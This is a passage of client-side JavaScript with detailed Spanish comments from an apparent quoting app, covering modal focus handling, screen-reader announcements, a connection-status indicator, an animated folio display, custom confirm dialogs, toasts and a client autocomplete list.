     que se puede dejar de donde estaba el usuario. */
  if(!arriba&&document.activeElement===document.body){
    const anc=$('contenido');
    if(anc){ anc.tabIndex=-1; try{ anc.focus({preventScroll:true}); }catch(_){} }
  }
}
const _obsModal=new MutationObserver(regs=>{
  for(const r of regs){
    const m=r.target, ahora=m.classList.contains('show');
    if(ahora===(m.dataset.abierto==='1'))continue;   // la clase cambió, el estado no
    m.dataset.abierto=ahora?'1':'0';
    if(ahora) _modalAbierto(m); else _modalCerrado(m);
  }
});
function _vigilarModales(){
  for(const [id] of _CAPAS){
    const el=document.getElementById(id); if(!el)continue;
    el.dataset.abierto=el.classList.contains('show')?'1':'0';
    _obsModal.observe(el,{attributes:true,attributeFilter:['class']});
  }
}
/* El modal de Registrar Venta está al final del documento, después de este script:
   si se registrara aquí mismo, getElementById devolvería null y ese sería el único
   modal sin foco atrapado. */
if(document.readyState==='loading') document.addEventListener('DOMContentLoaded',_vigilarModales,{once:true});
else _vigilarModales();

/* ----- Decirlo solo al lector de pantalla -----
   Para los cambios que con la vista se entienden de un golpe y sin ella no existen:
   plegar de golpe todas las partidas, por ejemplo. Un aviso emergente ahí sería ruido
   visual por algo que ya se ve.

   El textContent='' y la escritura en el fotograma siguiente son los que hacen que la
   región activa cuente el mensaje como inserción nueva aunque el texto se repita: sin
   eso, «4 partidas plegadas» dos veces seguidas se oye una sola. */
function voz(msg,urgente){
  const el=$(urgente?'vozAlert':'vozStatus'); if(!el) return;
  el.textContent='';
  requestAnimationFrame(()=>{ el.textContent=msg; });
}
/* ----- Las hojas del teléfono se cierran deslizando -----
   En el teléfono los modales salen desde abajo como una hoja del sistema, y el gesto que va con
   una hoja —bajarla con el dedo— vive ahora en js/piezas.js (P.hojasDeslizables), UNA vez para
   las dos apps: era una copia de la de la plataforma y las dos llevaban el mismo defecto, el velo
   aclarándose con `opacity` sobre el padre de la hoja, o sea con la hoja entera encima al 35 %.
   Las medidas —solo desde el encabezado o con el cuerpo arriba del todo, 90 px o el latigazo de
   0,11 px/ms, el touchmove colgado solo durante el gesto— y su porqué están allí.
   Aquí solo se dice qué es hoja en el cotizador y con qué se cierra: la función de su capa
   (_CAPAS), la misma de la ×, así que el foco, el atrás del teléfono y lo que cada modal limpia
   al cerrarse pasan igual. */
if(window.Piezas&&Piezas.hojasDeslizables) Piezas.hojasDeslizables({
  hoja:'.modal-bg.show>.modal',cabeza:'.modal-h',cuerpo:'.modal-b',
  cierre:velo=>(_CAPAS.find(([id])=>id===velo.id)||[])[1]||null
});
/* Y lo que pasa por debajo del dock y de la barra de arriba del teléfono se funde en vez de
   cortarse contra su canto (pieza 11). La de arriba solo a ≤560 px: más ancho, el resumen de la
   partida se pega justo debajo de la barra y quedaría borroso. */
if(window.Piezas&&Piezas.desenfoqueProgresivo){
  Piezas.desenfoqueProgresivo('#mbar',{lado:'abajo'});
  Piezas.desenfoqueProgresivo('.topbar',{lado:'arriba',media:'(max-width:560px)'});
}

/* ----- La isla de estado (C21) -----
   Tres cosas pasan fuera de esta pantalla y las tres eran invisibles desde aquí: que no hay señal,
   que la hoja está sellando el precio, y que una solicitud espera a que Dirección conteste. La
   primera era un chip que aparecía de golpe junto al folio; las otras dos solo se veían bajando
   hasta la columna del dinero. Ahora es UNA pastilla, la de #isla, con un solo role="status": se
   desenrolla al cambiar el estado, dice lo que pasa y se enrolla sola.

   Quién se queda abierto lo decide la espera: «Sellando» es cosa de segundos y es justo lo que se
   está esperando, así que se queda abierto; «Sin señal» y «Esperando a Dirección» pueden durar
   horas, así que dicen su frase 3,5 s y se quedan en el icono mientras duren. Al terminar, si hay
   un resultado que se pueda afirmar, lo dice 1,6 s con la palomita dibujada y se va. Si no se
   puede afirmar —sellar falló y el error ya salió en su aviso; la solicitud se canceló—, se va sin
   decir nada: una pastilla que anuncia «Sellada» sobre un sello que no existe es peor que callar.

   De dónde sale cada estado, sin tocar a los dueños de ellos: `navigator.onLine`, `_sellando`
   (proceso.js) y `_foliosEsperando()` (notario.js). Esos dos cambian en funciones que no son de
   esta pieza, así que arranque.js engancha un aviso detrás de saveState, saveQueue y renderAuth
   (programarIsla), y la pastilla compara lo que hay con lo que enseñaba: solo se mueve cuando
   cambió el estado, nunca por repintar. Con las tres cosas apagadas no hay nada en pantalla y
   nada que se mueva.

   Hasta 560 px la barra de arriba está medida al píxel: ahí es solo el icono, sin crecer (el
   texto sigue en el árbol, recortado, para el lector de pantalla). Desde 561 px el ancho sí
   se anima: es un elemento de 32 px entre ocho hermanos, tres veces por sesión, y es el único
   sitio de la hoja donde se anima un ancho —clip-path hubiera dejado el hueco reservado—. El
   texto entra en opacidad. El único giro es el arco de «Sellando», y solo mientras sella. */
const _ISLA_FRASES={'sin-senal':'Sin señal · se guarda aquí',sellando:'Sellando en la hoja…',esperando:'Esperando a Dirección'};
const _ISLA_TITULOS={
  'sin-senal':'Sin señal: la cotización se sigue guardando en este teléfono. Autorizar y la IA esperan a la señal.',
  sellando:'La hoja está sellando el precio.',
  esperando:'Una solicitud espera a que Dirección conteste.',
  ok:''
};
let _islaVivos=new Map(), _islaEnrolla=0, _islaSigue=0, _islaFin=0, _islaPide=0;
function _islaAncha(){ try{ return !window.matchMedia('(max-width:560px)').matches; }catch(_){ return true; } }
function _islaIcono(ic,clave){
  const P=window.Piezas;
  if(clave==='sin-senal'||!P||!P.marcaEstado){ ic.innerHTML=ico(clave==='sin-senal'?'i-nube-off':'i-check'); return; }
  /* El glifo de estado de la hoja, el mismo de la cola del notario y de la sincronización: un arco
     que gira mientras se espera, un anillo punteado mientras Dirección piensa, y la palomita que
     se dibuja al terminar. Pasar de uno a otro conserva el nodo, así el arco «se vuelve» palomita. */
  if(!ic.querySelector('.marca-estado')) ic.innerHTML='';
  P.marcaEstado(ic,{sellando:'trabaja',esperando:'espera',ok:'ok'}[clave],{tam:18});
}
function _islaEnrollar(){ const el=$('isla'); if(!el) return; el.classList.remove('abierta'); el.style.width='32px'; }
function _islaMostrar(clave,texto,o){
  const el=$('isla'); if(!el) return;
  o=o||{};
  const t=el.querySelector('.isla-t'), ic=el.querySelector('.isla-ic');
  clearTimeout(_islaFin); clearTimeout(_islaEnrolla);
  el.classList.remove('se-va');
  el.dataset.estado=clave;
  if(o.tono) el.dataset.tono=o.tono; else delete el.dataset.tono;
  el.title=_ISLA_TITULOS[clave]||'';
  _islaIcono(ic,clave);
  t.textContent=texto;
  el.classList.add('ver');
  let ancho=32;
  if(o.abrir!==false&&_islaAncha()){
    ancho=32+t.offsetWidth;
    /* ¿Cabe sin romper la barra? Con el ancho de una laptop chica (1100 px) la frase ancha empujaba
       el grupo de botones a un segundo renglón y TODA la pantalla bajaba 50 px mientras duraba, para
       volver a subir al enrollarse. Se prueba en seco —sin transición, en el mismo cuadro, sin que
       se vea— si la barra crece con el ancho abierto; si crece, la isla se queda en el icono. */
    const cab=document.querySelector('.topbar-in');
    if(cab){
      const trans=el.style.transition, w0=el.style.width;
      el.style.transition='none';
      el.style.width='32px'; const alto0=cab.offsetHeight;
      el.style.width=ancho+'px'; const cabe=cab.offsetHeight<=alto0;
      el.style.width=w0; void el.offsetWidth; el.style.transition=trans;
      if(!cabe) ancho=32;
    }
  }
  if(ancho>32){ el.classList.add('abierta'); el.style.width=ancho+'px'; }
  else _islaEnrollar();
  if(o.enrollarEn) _islaEnrolla=setTimeout(_islaEnrollar,o.enrollarEn);
}
function _islaSiguiente(){
  const el=$('isla'); if(!el) return;
  const ultimo=[..._islaVivos.keys()].pop();
  if(ultimo){ _islaMostrar(ultimo,_islaVivos.get(ultimo),{abrir:false}); return; }
  /* Nada más que decir: se desvanece y, ya invisible, se recorta. Quitar `.ver` de golpe la
     habría hecho desaparecer a media palabra. */
  clearTimeout(_islaEnrolla);
  el.classList.add('se-va'); el.style.width='0px';
  _islaFin=setTimeout(()=>{
    if(_islaVivos.size) return;
    el.classList.remove('ver','abierta','se-va'); el.style.width='';
    delete el.dataset.estado; delete el.dataset.tono; el.title='';
    const t=el.querySelector('.isla-t'); if(t) t.textContent='';
    /* Sin glifo: el arco de «Sellando» sigue girando aunque la pastilla esté invisible, y en reposo
       no se mueve nada. */
    const ic=el.querySelector('.isla-ic'); if(ic) ic.innerHTML='';
  },340);
}
function _islaPoner(clave,texto){
  _islaVivos.delete(clave); _islaVivos.set(clave,texto);
  clearTimeout(_islaSigue);
  _islaMostrar(clave,texto,{enrollarEn:clave==='sellando'?0:3500});
}
function _islaQuitar(clave,final){
  if(!_islaVivos.delete(clave)) return;
  clearTimeout(_islaSigue);
  if(final){ _islaMostrar('ok',final,{tono:'ok',enrollarEn:1600}); _islaSigue=setTimeout(_islaSiguiente,2100); }
  else _islaSiguiente();
}
/* Qué se puede afirmar al terminar. Solo lo que la pantalla sabe de cierto: la cotización de
   ahora quedó autorizada. */
function _islaFinal(clave){
  if(clave==='sin-senal') return 'Volvió la señal';
  if(Q.estado==='autorizada') return clave==='sellando'?'Sellada':'Dirección autorizó';
  return '';
}
/* El nombre es el de siempre —lo llaman el arranque, 'online' y 'offline'— y ahora pinta la
   isla entera: compara lo que hay con lo que enseñaba y solo se mueve si cambió. */
function pintarConexion(){
  clearTimeout(_islaPide); _islaPide=0;
  if(!$('isla')) return;
  let sellando=false, esperan=0;
  try{ sellando=typeof _sellando!=='undefined'&&!!_sellando; }catch(_){}
  try{ esperan=typeof _foliosEsperando==='function'?_foliosEsperando().length:0; }catch(_){}
  const hay={'sin-senal':navigator.onLine===false,sellando,esperando:esperan>0};
  ['sin-senal','sellando','esperando'].forEach(k=>{
    const texto=_ISLA_FRASES[k]+(k==='esperando'&&esperan>1?' · '+esperan:'');
    if(hay[k]){ if(_islaVivos.get(k)!==texto) _islaPoner(k,texto); }
    else if(_islaVivos.has(k)) _islaQuitar(k,_islaFinal(k));
  });
}
/* Detrás de cada guardado y de cada repintado del panel, pero SIN mirar nada en el momento:
   saveState corre en cada tecla y _foliosEsperando() lee la cola entera del almacenamiento. Se
   pide una vez y se resuelve un cuarto de segundo después, y las peticiones de en medio se juntan. */
function programarIsla(){ if(!_islaPide) _islaPide=setTimeout(pintarConexion,250); }
window.addEventListener('online',()=>{
  const estaba=_islaVivos.has('sin-senal');
  pintarConexion();
  /* Con la palabra a la vista la isla ya lo dijo. En el teléfono es solo un icono, y en una barra
     llena la frase tampoco cupo: ahí sale como aviso. */
  const el=$('isla');
  if(estaba&&!(el&&el.classList.contains('abierta'))) toast('Volvió la señal','ok',2200);
});
window.addEventListener('offline',pintarConexion);

/* ----- El folio que cambia se nota (C24) -----
   El folio se reescribía sin ninguna señal, y el error que ya está documentado en este repo es
   capturar a otro cliente encima del mismo folio: el número cambia —al empezar una cotización
   nueva, al abrir una del historial, al re-foliar—, nadie lo ve cambiar, y lo siguiente que se
   teclea cae en la cotización equivocada. Ahora, al pasar a otro número, VOLTEAN los caracteres
   que cambiaron, como un tablero de salidas: una vuelta (110 ms hacia abajo, 150 ms de regreso),
   escalonada de 30 ms en 30 ms de izquierda a derecha, sin caracteres al azar en medio.

   Solo voltean los que cambiaron —de COT-0042 a COT-0043 gira un solo dígito—, y solo si ya había
   un folio escrito: al arrancar, o al repintar el mismo número, no se mueve nada. Con menos
   movimiento el número cambia en seco. La marca «sin guardar» no es de este folio y NO voltea:
   la pone pintarFolio() aparte, como hermana.

   Cada casilla guarda su destino (data-c): si llega otro folio a media vuelta, se cancela la
   vuelta de esa casilla y empieza una nueva hacia el destino nuevo, así nunca queda escrito un
   número que ya no es el vigente. Las casillas van aria-hidden y el folio entero va en un
   <span class="folio-sr">, recortado pero en el árbol: el lector de pantalla lee «COT-0043» de un
   tirón y no letra por letra. Solo se anima `transform` (rotateX) en un elemento de ocho
   caracteres. Devuelve cuántas casillas voltearon. */
function folioQueVoltea(el,nuevo){
  if(!el) return 0;
  nuevo=String(nuevo==null?'':nuevo);
  let sr=el.querySelector(':scope>.folio-sr'), caja=el.querySelector(':scope>.fcs');
  if(!sr||!caja){
    el.textContent='';
    sr=document.createElement('span'); sr.className='folio-sr solo-voz';
    caja=document.createElement('span'); caja.className='fcs'; caja.setAttribute('aria-hidden','true');
    el.append(sr,caja);
    delete el.dataset.folio;
  }
  const viejo=el.dataset.folio||'';
  if(viejo===nuevo&&caja.children.length===nuevo.length) return 0;
  el.dataset.folio=nuevo; sr.textContent=nuevo;
  while(caja.children.length<nuevo.length){ const s=document.createElement('span'); s.className='fc'; caja.append(s); }
  while(caja.children.length>nuevo.length) caja.lastElementChild.remove();
  const P=window.Piezas;
  const quieto=!viejo||!caja.animate||(P&&P.sinMovimiento&&P.sinMovimiento());
  let k=0;
  [...caja.children].forEach((s,i)=>{
    const c=nuevo[i];
    if(s.dataset.c===c&&s.textContent===c) return;
    s.dataset.c=c;
    clearTimeout(s._volT);
    if(s.getAnimations) s.getAnimations().forEach(a=>a.cancel());
    s.classList.remove('volteando');
    if(quieto){ s.textContent=c; return; }
    const demora=k++*30;
    /* La línea del medio de la casilla solo se ve mientras gira, no mientras espera su turno. */
    s._volT=setTimeout(()=>s.classList.add('volteando'),demora);
    const baja=s.animate([{transform:'rotateX(0deg)'},{transform:'rotateX(-90deg)'}],{duration:110,delay:demora,easing:'cubic-bezier(.5,0,1,1)',fill:'forwards'});
    baja.finished.then(()=>{
      s.textContent=s.dataset.c; baja.cancel();
      s.animate([{transform:'rotateX(90deg)'},{transform:'rotateX(0deg)'}],{duration:150,easing:'cubic-bezier(0,0,.2,1)'})
        .finished.then(()=>s.classList.remove('volteando'),()=>{});
    },()=>{});   // cancelada por un folio más nuevo: ya no escribe nada
  });
  return k;
}

/* ----- Preguntar antes, sin el confirm() del navegador -----
   Seis preguntas de esta app —borrar del historial, abrir otra cotización encima de un
   borrador, restaurar un respaldo— salían en la ventanita gris del navegador: otra tipografía,
   otro idioma de botones («Aceptar»), sin atrás del teléfono y bloqueando la página entera.
   Es el momento en que la app deja de parecer una app. Ésta es la misma pregunta dentro de la
   app: una capa más de _CAPAS —foco atrapado, Escape, el atrás del teléfono— que contesta con
   una promesa. Cualquier forma de cerrarla que no sea el botón de seguir es un «no».

   Lo que se pregunta con `peligro` es lo que no tiene vuelta —la cotización de la pantalla se
   pierde si se abre otra encima, las medidas del escalador se borran—, y un toque no alcanza para
   contestarlo: el botón de seguir se vuelve «mantener presionado» (pieza 5, C23 #5), con la
   acción en su alConfirmar. La pieza deja sin clic de siempre al botón, así que el `onclick` del
   marcado no corre mientras esté armada; en las preguntas sin peligro se le devuelve. Como este
   diálogo se reusa y aquí se reescribe el rótulo (y la clase) en cada pregunta, se vuelve a armar
   o a quitar en cada una: la pieza reconoce que su marcado ya no está y no deja oyentes de más.
   Un segundo y no más: son preguntas que salen mientras se trabaja (abrir otra cotización desde el
   historial), y los 1,2 s de la pieza por omisión pesan cuando se repiten. */
let _confResolver=null;
function confirmar(o){
  o=o||{};
  return new Promise(res=>{
    if(_confResolver) _confResolver(false);   // no se anidan: la de antes contesta «no»
    _confResolver=res;
    $('conf-titulo').textContent=o.titulo||'¿Continuar?';
    $('conf-texto').textContent=o.texto||'';
    const si=$('conf-si'); si.textContent=o.si||'Continuar'; si.className='btn '+(o.peligro?'btn-dgr':'btn-pri');
    $('conf-no').textContent=o.no||'Cancelar';
    /* ----- Sostener para confirmar: solo donde se BORRA, y por eso no cuelga de `peligro` -----
       La primera versión ató el sostener a `peligro`, que es lo que pedía el paquete para «lo
       destructivo». Pero las cinco preguntas marcadas así en el cotizador no borran nada: dicen
       «si abres COT-0042, la que está en pantalla se pierde», y abrir otra cotización del historial
       se hace muchas veces al día. Un segundo de espera cada vez deja de ser una red y se vuelve un
       peaje, y un peaje se aprende a pagar sin leer: justo lo contrario de lo que se buscaba.

       Así que `peligro` se queda con lo suyo —el botón rojo, que dice de qué lado está la pregunta—
       y el sostener se pide aparte, con `sostener:true`, solo donde algo se borra de verdad. Hoy lo
       usa una: cargar otra imagen en el escalador, que sí borra las medidas tomadas. Lo demás que
       sostiene en la app (la × de una partida con datos, borrar del historial, «Sí, borrar todo» y
       restaurar un respaldo) no pasa por aquí: lo arma cada pantalla sobre su propio botón. */
    const P=window.Piezas;
    if(P&&P.mantener){
      if(o.sostener) P.mantener(si,{tono:'mal',ms:1000,alConfirmar:confirmarSi});
      else P.mantener.quitar(si);
    }
    /* Dicho también en la pantalla, antes de que alguien toque y no pase nada: la pieza solo avisa
       cuando un toque corto ya falló. Va aria-hidden porque el botón mismo ya dice «mantén
       presionado para confirmar» a quien no lo ve. */
    const pista=$('conf-pista'); if(pista) pista.hidden=!o.sostener;
    $('confmodal').classList.add('show');
  });
}
function _confCerrar(v){ $('confmodal').classList.remove('show'); const r=_confResolver; _confResolver=null; if(r) r(v); }
function confirmarSi(){ _confCerrar(true); }
function confirmarNo(){ _confCerrar(false); }

/* Aviso emergente. El cuerpo es la pieza compartida (js/piezas.js, P.aviso): la pila de hasta dos
   avisos con su mecha. Aquí queda la firma de siempre, que es contrato para las ~150 llamadas
   del cotizador: toast(msg, tipo, dur, accion).

   Hasta esta versión había un solo #toast con un solo temporizador, y un aviso reescribía al
   otro en el mismo tick. El caso que importaba: aplicarSello() avisa «el total de este teléfono
   no es el que selló la hoja» y la línea siguiente del notario dice «✓ … autorizó», que lo
   tapaba —y ese error es justo el que impide mandar un PDF con un total y un QR con otro—.
   Ahora un error y un aviso con botón no se pisan: se apilan (dos como mucho) o esperan su
   turno, y los informativos se reemplazan como antes. La mecha de 2 px es el reloj: se pausa
   con el dedo, el cursor o el foco encima y con la app en segundo plano —un «Deshacer» de 8 s
   caducaba mientras el vendedor estaba en WhatsApp pegando los datos—, y el aviso se quita
   deslizándolo hacia abajo. Todo eso vive en la pieza; lo que se promete aquí no cambia:
     · con botón, 8 s como mínimo —quien lo oye en vez de verlo tiene que encontrar «Deshacer»
       deslizando, y los 2.6 s de siempre no alcanzan ni para llegar—; si el llamador pide más,
       se respeta;
     · el texto va por textContent;
     · cada aviso se dice en la región que habla (P.voz, la misma de voz()), también el que
       espera su turno para verse, y los errores en la asertiva. El aviso se escribe fuera del
       árbol de accesibilidad mientras entra, así que sin esa región ni VoiceOver ni TalkBack
       decían nada.
   Devuelve un mango con cerrar(), por si alguien necesita quitar su aviso («Mandando…») al
   llegar la respuesta. Sin la pieza —un js/piezas.js que no cargó— el aviso al menos se dice. */
function toast(msg,type='',dur=2600,accion=null){
  if(accion&&dur<8000) dur=8000;
  const P=window.Piezas;
  if(!P||!P.aviso){ voz(msg+(accion&&accion.label?' — '+accion.label+' disponible':''),type==='err'); return null; }
  return P.aviso(msg,{tipo:type,dur,accion,pila:'toast'});
}

/* Copiar al portapapeles, con respaldo. En iOS y en páginas no seguras la API
   moderna falla; antes cada botón reaccionaba distinto (uno tenía respaldo y los
   otros solo avisaban del error), así que copiar dependía del botón que tocaras.
   El respaldo y la confirmación viven en la pieza compartida (P.copiar, el mismo de la
   plataforma), y el botón que se tocó lo dice él mismo —«✓ Copiado», 1.8 s— además del
   aviso, que trae la instrucción de dónde pegarlo. El botón sale del clic que está corriendo
   (P.botonDelEvento), así que ninguna llamada cambia. */
function copiarTexto(txt,msgOk,extra){
  const ok=()=>{ if(msgOk) toast(msgOk,'ok',3400); if(typeof extra==='function') extra(); };
  const P=window.Piezas;
  if(!P||!P.copiar){ _copiaManual(txt,ok); return; }
  P.copiar(txt,{boton:P.botonDelEvento()}).then(bien=>{
    if(bien) ok(); else toast('No se pudo copiar automáticamente','err',3000);
  });
}

/* ===================== Preferencias del dispositivo =====================
   Datos que se volvían a poner igual en cada cotización —el nombre de quien autoriza,
   el material que casi siempre se usa, el porcentaje de comisión y la cuenta donde
   entra el anticipo—. No son parte de la cotización: son de quien usa este teléfono,
   así que viven fuera de Q y no viajan al historial, al PDF ni a la cola. */
const PREF_AUTORIZADOR='al3d_autorizador', PREF_MATERIAL='al3d_ult_material',
      PREF_RV_PCT='al3d_rv_pct', PREF_RV_CUENTA='al3d_rv_cuenta';
/* La imagen analizada por IA se guarda en su propia clave, no dentro de al3d_q — el
   por qué está en sincronizarAiFile(). Se declara aquí, junto a las demás claves de
   almacenamiento, porque la lista del respaldo la necesita y se arma antes. */
const AI_FILE_KEY='al3d_aifile';
const AI_FILE_MAX=2000000;      // ~2 MB: más que eso no conviene junto al historial
let _aiFileGuardada=null;       // url ya escrita en el almacenamiento, o null si no cupo
let _aiFileFallo=null;          // url que YA se intentó y no cupo: no se reintenta en cada tecla
function prefGet(k,def=''){ try{ const v=localStorage.getItem(k); return v===null?def:v; }catch(_){ return def; } }
function prefSet(k,v){ try{ localStorage.setItem(k,String(v)); }catch(_){} }

/* ===================== Clientes ya conocidos =====================
   El historial ya guardaba nombre, teléfono y dirección de cada cliente autorizado,
   pero el campo Cliente arrancaba vacío siempre: el cliente que regresaba por su
   segundo letrero se tecleaba completo otra vez. Se sugieren los del historial y, al
   elegir uno, se llenan los campos que estén VACÍOS —nunca se pisa lo ya escrito. */
function normNom(s){ return String(s||'').trim().toLowerCase().replace(/\s+/g,' '); }
/* Con caché, igual que los cuadernos. Se llamaba en CADA tecla del campo Cliente —upd →
   autocompletarCliente— y cada llamada parseaba el historial entero, con sus imágenes en
   base64 dentro: en un teléfono, con veinte cotizaciones con foto, eso es teclear a tirones.
   El historial solo cambia por saveHistorial, que la invalida. */
let _clientesCache=null;
function invalidarClientes(){ _clientesCache=null; }
function clientesConocidos(){
  if(_clientesCache) return _clientesCache;
  const m=new Map();
  /* El historial está ordenado de lo más reciente a lo más viejo, así que el primero
     que aparece manda; de los demás solo se toman los huecos que dejó. */
  getHistorial().forEach(e=>{
    const k=normNom(e.cliente); if(!k) return;
    const prev=m.get(k);
    if(!prev){ m.set(k,{cliente:e.cliente,tel:e.tel||'',dirRaw:e.dirRaw||'',maps:e.maps||''}); return; }
    if(!prev.tel&&e.tel) prev.tel=e.tel;
    if(!prev.dirRaw&&e.dirRaw) prev.dirRaw=e.dirRaw;
    if(!prev.maps&&e.maps) prev.maps=e.maps;
  });
  _clientesCache=[...m.values()];
  return _clientesCache;
}
function pintarClientes(){
  /* La lista del campo Cliente (C6) se pinta al abrirse, con lo que haya entonces. Si ya está
     abierta y el historial cambió por debajo —se guardó una cotización, se borró otra—, se rehace. */
  if(_comboAbierto()) _comboFiltrar();
  /* Esta función ya corría después de cada escritura del historial y al arrancar, que es
     exactamente cuando el aviso de «ya tiene cuaderno» puede haber cambiado. */
  actualizarAvisoCuaderno();
}
/* «Lo vacié yo, a propósito» — la diferencia que le faltaba a autocompletar.
   Rellenar un campo vacío es lo correcto la primera vez y es un estorbo la segunda: el teléfono
   del cliente estaba mal, vuelves al paso 1, lo borras para reteclearlo, tocas el nombre… y
   autocompletar ve el campo vacío, reconoce al cliente y te devuelve el teléfono VIEJO, con su
   toast de «se llenó el teléfono». La corrección se deshacía sola.
   La marca se cuelga del evento 'input' y NO de upd/updMaps/updDirRaw: esas tres se llaman
   también desde el código con cadena vacía —el propio arranque, deshacerVaciado,
   reabrirDeHistorial, usarComoBase, loadQueueEntry— y marcarían campos que nadie tocó. 'input'
   no se dispara al asignar .value por programa, que es justo la diferencia que hace falta.
   Va por folio, como _paDraft: es de esta captura, no del aparato. */
let _vaciadoAMano=null;
function vaciadoAMano(k){ return !!(_vaciadoAMano&&_vaciadoAMano.folio===Q.folio&&_vaciadoAMano.set.has(k)); }
function marcarVaciado(k,v){
  if(!_vaciadoAMano||_vaciadoAMano.folio!==Q.folio) _vaciadoAMano={folio:Q.folio,set:new Set()};
  if(String(v||'').trim()) _vaciadoAMano.set.delete(k); else _vaciadoAMano.set.add(k);
}
/* ----- Lo que puso la app se ve, y se distingue de lo que tecleaste (C6) -----
   Al reconocer a un cliente, la app llena el teléfono, la dirección y el link de Maps que estén
   VACÍOS, y hasta ahora lo único que lo decía era un aviso que se va solo: nada mostraba CUÁL
   campo había cambiado, y con el aviso ya ido no había forma de saber si ese teléfono lo escribió
   alguien o lo puso la app. Cada campo que la app llena se ilumina en verde un instante (600 ms,
   el lavado de CodeSlots). Con menos movimiento no hay fundido pero la señal se queda: el mismo
   verde, quieto, 1,2 s —es información, no adorno—.

   Y la app se acuerda de lo que escribió (_puestoApp): si el campo sigue diciendo exactamente lo
   que ella puso, nadie lo tocó, y elegir OTRO cliente de la lista —dos «Farmacia Guadalupe» con
   distinto teléfono— sí lo cambia. Lo que tecleó una persona nunca se pisa, y lo que una persona
   borró a propósito (vaciadoAMano) tampoco vuelve. */
const _CAMPOS_CLIENTE=[
  {k:'tel',id:'f-tel',nombre:'el teléfono'},
  {k:'dirRaw',id:'f-dir-raw',nombre:'la dirección'},
  {k:'maps',id:'f-maps',nombre:'el link de Maps'}
];
let _puestoApp=null;
function lavarCampo(el){
  if(!el) return;
  clearTimeout(el._lavT);
  el.classList.remove('lavado','lavado-quieto');
  const P=window.Piezas;
  if(P&&P.sinMovimiento&&P.sinMovimiento()){
    el.classList.add('lavado-quieto');
    el._lavT=setTimeout(()=>el.classList.remove('lavado-quieto'),1200);
    return;
  }
  void el.offsetWidth;   // reinicia la animación si se lavó hace nada
  el.classList.add('lavado');
  el._lavT=setTimeout(()=>el.classList.remove('lavado'),700);
}
/* `elegido` es el cuaderno que se tocó en la lista (C6); sin él, es el cliente que se reconoció
   por teclear su nombre completo, que es lo que hacía desde siempre. */
function autocompletarCliente(v,elegido){
  if(locked()) return;
  const c=elegido
    ? {cliente:elegido.nombre,tel:elegido.tel||'',dirRaw:elegido.dirRaw||'',maps:elegido.maps||''}
    : clientesConocidos().find(x=>normNom(x.cliente)===normNom(v));
  if(!c) return;
  if(!_puestoApp||_puestoApp.folio!==Q.folio) _puestoApp={folio:Q.folio};
  const puestos=[]; let respetados=0;
  _CAMPOS_CLIENTE.forEach(f=>{
    const valor=c[f.k]; if(!valor) return;
    const el=$(f.id), actual=String((f.k==='tel'?Q.tel:f.k==='dirRaw'?Q.dirRaw:Q.maps)||'').trim();
    const mio=!!(elegido&&actual&&el&&_puestoApp[f.k]!==undefined&&el.value.trim()===_puestoApp[f.k]&&actual!==String(valor).trim());
    if(vaciadoAMano(f.k)||(actual&&!mio)){ if(actual) respetados++; return; }
    if(el) el.value=valor;
    if(f.k==='tel') Q.tel=el?el.value:valor;   // la pieza del teléfono pudo darle formato al escribirlo
    else if(f.k==='dirRaw') updDirRaw(valor);
    else { updMaps(valor); Q.maps=valor; }
    _puestoApp[f.k]=el?el.value.trim():String(valor).trim();
    lavarCampo(el);
    puestos.push(f.nombre);
  });
  if(!puestos.length){
    /* Elegido con la mano y sin nada que llenar porque ya había datos tuyos: se dice, para que
       no parezca que el toque no hizo nada. */
    if(elegido&&respetados) toast('Los datos que ya tenías no se tocaron','',2600);
    return;   // ya estaban llenos: nada que avisar
  }
  /* El lavado se vería debajo de la lista si siguiera abierta: se cierra y no vuelve a abrirse con
     esta misma tecla (el oyente de 'input' de la lista corre justo después de upd(), en el mismo
     evento, y ahí se gasta la marca; el temporizador la quita si upd() se llamó sin tecla). */
  _comboCerrar();
  if(!elegido){ _comboNoAbrir=true; setTimeout(()=>{ _comboNoAbrir=false; },0); }
  saveState(); updProg();
  toast('Cliente conocido — se '+(puestos.length===1?'llenó':'llenaron')+' '+listaY(puestos),'ok',3400);
}

/* ----- La lista de clientes, propia (C6) -----
   El <datalist> nativo era una tira sobre el teclado de Android, sin teléfono y sin decir cuál de
   dos «Farmacia San Juan» era cuál. Aquí es una lista bajo el campo con el nombre, el teléfono y
   la última cotización del cuaderno —folio, fecha e importe—, y la fila que se recorre con las
   flechas es UN solo resalte que se desliza (translateY) de un renglón al siguiente, no un fondo
   por fila. El patrón es el combobox de siempre: el campo conserva el foco, `aria-activedescendant`
   dice cuál fila está activa, flechas, Enter y Escape, y tocar una fila la elige.

   Va sobre un popover manual: sube a la capa superior, así que ninguna tarjeta ni la barra fija de
   abajo la recorta, y se coloca contra el teclado con visualViewport. Si el campo está tan abajo
   que no cabe, se abre hacia arriba. Renglones de 60 px: el dedo acierta sin apuntar.

   Las filas salen de cuadernos() —no de clientesConocidos()— a propósito: ahí dos clientes con el
   mismo nombre y distinto teléfono son DOS renglones, que es justo lo que hay que poder distinguir;
   clientesConocidos() los junta por nombre, que es lo que hace falta para reconocer a quien
   teclea el nombre completo. El importe de la última cotización es de este trabajo, no del
   catálogo: en borrador se difumina como los demás (precios-ocultos). Sin ningún cuaderno, o sin
   coincidencias, la lista no se abre: un «nadie con ese nombre» cada vez que se captura un cliente
   nuevo era ruido encima del campo del teléfono. */
let _comboAct=-1, _comboFilas=[], _comboDentro=false, _comboNoAbrir=false, _comboRepos=0, _comboVozT=0, _comboVozN=-1, _comboArmado=false;
function _comboAbierto(){ const m=$('cli-menu'); return !!m&&m.dataset.abierto==='1'; }
function _comboFilasPara(q){
  const P=window.Piezas;
  q=String(q||'').trim();
  const todos=(typeof cuadernos==='function'?cuadernos():[]).filter(g=>g.nombre);
  if(!q||!P||!P.coincide) return todos;   // ya vienen del que se habló hace menos al más viejo
  const num=P.esNumerica(q)&&q.replace(/\D/g,'').length>=3;
  return todos.filter(g=>P.coincide(g.nombre,q)||g.alias.some(a=>P.coincide(a,q))||(num&&P.coincide(g.tel||'',q)));
}
function _comboTel(g){
  const d=typeof telClave==='function'?telClave(g.tel):'';
  const P=window.Piezas;
  return d&&P&&P.telefono?P.telefono.formato(d):String(g.tel||'');
}
function _comboFilaHTML(g,i,q){
  const P=window.Piezas, e=g.cots[0];
  const ult=e?'Última: '+esc(e.folio)+' · '+esc(cuaFecha(e))+' · <span class="combo-importe">'+money(totalFinalHist(e))+'</span>':'Sin cotizaciones';
  const tel=_comboTel(g);
  return '<div role="option" class="combo-op" id="cli-op-'+i+'" data-i="'+i+'" aria-selected="false">'
